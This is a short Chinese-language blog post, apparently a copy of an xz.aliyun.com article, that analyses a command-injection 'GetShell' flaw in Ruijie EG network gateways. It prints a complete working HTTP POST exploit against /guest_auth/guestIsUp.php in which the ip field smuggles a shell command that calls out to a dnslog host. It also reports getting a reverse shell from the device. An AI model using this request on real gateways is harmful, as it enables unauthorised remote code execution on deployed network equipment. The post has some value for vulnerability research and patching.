> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9016?accounttraceid=c50077859b5d464683c8caa2f614ea1fzuqw)

2020 1-11 看到群里发了一个锐捷网关系列通杀 GetShell 的漏洞  
[https://github.com/Tas9er/EgGateWayGetShell](https://github.com/Tas9er/EgGateWayGetShell)

下载 jar 文件。使用 jd-gui 打开源码。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210112114502-8d23b836-5488-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210112114502-8d23b836-5488-1.png)

可以看到的是。  
通过 POST /guest_auth/guestIsUp.php URL post 了一个代码执行的命令。

EXP 如下：

```
POST /guest_auth/guestIsUp.php HTTP/1.1
Host: 192.168.10.1
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 56


mac=1&ip=127.0.0.1|curl xxx.dnslog.cn
```

反弹 shell 回来。查看一下代码是什么样子的。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210112114741-ebcd8ee8-5488-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210112114741-ebcd8ee8-5488-1.png)

啊。这。代码。直接调用 cmd 代码执行了。